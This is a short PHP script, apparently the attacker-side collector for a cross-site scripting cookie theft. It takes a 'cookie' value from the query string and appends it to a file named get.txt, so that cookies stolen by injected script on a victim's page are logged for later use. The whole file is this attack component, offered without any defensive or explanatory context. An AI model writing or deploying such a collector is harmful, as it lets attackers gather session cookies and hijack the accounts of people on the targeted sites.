<?php
if(isset($_GET[ 'cookie' ])){
	$cookie =  $_GET[ 'cookie' ];
	if (file_exists('get.txt')) {
		$fp = fopen('get.txt', 'a');
		$text = $cookie . PHP_EOL;
		fwrite($fp, $text);
		fclose($fp);
	}
}

?>